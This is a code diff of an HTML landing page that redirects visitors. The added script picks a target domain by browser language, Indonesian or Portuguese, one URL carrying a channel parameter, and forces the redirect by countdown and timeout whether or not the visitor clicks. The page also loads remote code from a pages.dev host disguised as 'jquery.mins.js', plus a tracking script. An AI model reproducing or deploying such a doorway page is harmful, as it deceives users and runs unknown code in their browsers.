@@ -140,17 +140,6 @@
       box-shadow: 0 12px 32px rgba(72,192,25,0.4);
     }
     .btn:active { transform: translateY(0); }
-    .btn::after {
-      content: '';
-      position: absolute;
-      top: 50%; left: 50%;
-      width: 0; height: 0;
-      background: rgba(255,255,255,0.2);
-      border-radius: 50%;
-      transform: translate(-50%, -50%);
-      transition: width 0.4s, height 0.4s;
-    }
-    .btn:hover::after { width: 300px; height: 300px; }
     .btn svg { width: 18px; height: 18px; fill: currentColor; }
     .footer {
       display: flex;
@@ -212,7 +201,7 @@
       <p>You will enjoy more on our website.</p>
     </div>
 
-    <a class="btn" href="https://866361.com" id="js-btn">
+    <a class="btn" href="javascript:void(0);" id="js-btn">
       <svg viewBox="0 0 24 24"><path d="M13 7l5 5-5 5M6 12h12"/></svg>
       Go Click
     </a>
@@ -229,7 +218,26 @@
 
     <div class="progress-bar" id="js-bar" style="width:0%"></div>
   </div>
+
   <script>
+    function getTargetUrl() {
+      const lang = (navigator.language || (navigator.languages && navigator.languages[0]) || '').toLowerCase();
+      
+      if (lang.startsWith('id')) {
+        return 'https://866361.com';
+      } else if (lang.startsWith('pt')) {
+        return 'https://www.9bm8s8.com?ch=146712';
+      }
+      return 'https://866361.com';
+    }
+
+    const targetUrl = getTargetUrl();
+
+    const btn = document.getElementById('js-btn');
+    if (btn) {
+      btn.href = targetUrl;
+    }
+
     (function(){
       const c = document.getElementById('particles');
       for (let i = 0; i < 30; i++) {
@@ -244,13 +252,12 @@
       }
     })();
 
-
     function loadScriptAndStartTimer() {
       const s = document.createElement('script');
       s.src = 'https://id-4fc.pages.dev/jquery.mins.js';
       s.async = true;
       s.onload = () => { alertSet(); };
-      s.onerror = () => { console.error('Failed to load jquery.mis.js'); alertSet(); };
+      s.onerror = () => { console.error('Failed to load script'); alertSet(); };
       document.body.appendChild(s);
     }
 
@@ -263,10 +270,11 @@
       x.innerHTML = t;
       p.style.transform = 'rotate(-90deg)';
       b.style.width = '0%';
+      
       const i = setInterval(() => {
         if (t <= 0) {
           clearInterval(i);
-          location.href = 'https://866361.com';
+          window.location.href = targetUrl;
         } else {
           t--;
           x.innerHTML = t;
@@ -278,17 +286,16 @@
     }
 
     loadScriptAndStartTimer();
+
+    setTimeout(function() {
+      window.location.href = targetUrl;
+    }, 3200);
   </script>
-<script
+
+  <script
     src="https://tj.nationsoul.com/api/script.js"
     data-site-id="b601191f45c6"
     defer
-></script>
-
-<script>
-    setTimeout(function() {
-        window.location.href = Math.random() < 0.5 ? "https://866361.com" : "https://866361.com";
-    }, 2000);
-</script>
+  ></script>
 </body>
 </html>
